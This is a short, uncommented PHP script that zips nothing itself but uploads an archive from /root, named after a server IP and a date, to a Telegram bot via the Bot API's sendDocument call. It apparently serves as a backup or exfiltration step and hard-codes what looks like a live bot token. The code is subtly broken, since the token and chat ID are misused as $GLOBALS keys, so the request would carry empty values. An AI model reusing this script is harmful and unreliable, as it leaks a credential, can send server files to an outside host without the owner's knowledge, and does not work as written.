<?php
$filepath = realpath('/root/159.89.106.116-2024-01-21.zip');
$post = array('chat_id' => $GLOBALS["1624209723"],'document'=>new CurlFile($filepath));    
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://api.telegram.org/bot" . $GLOBALS["6568779328:AAHaq75VFPoPwlXLfHtrwie7T-zDsOXabFc"] . "/sendDocument");
curl_setopt($ch, CURLOPT_POST, 1);   
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_exec ($ch);
curl_close ($ch); 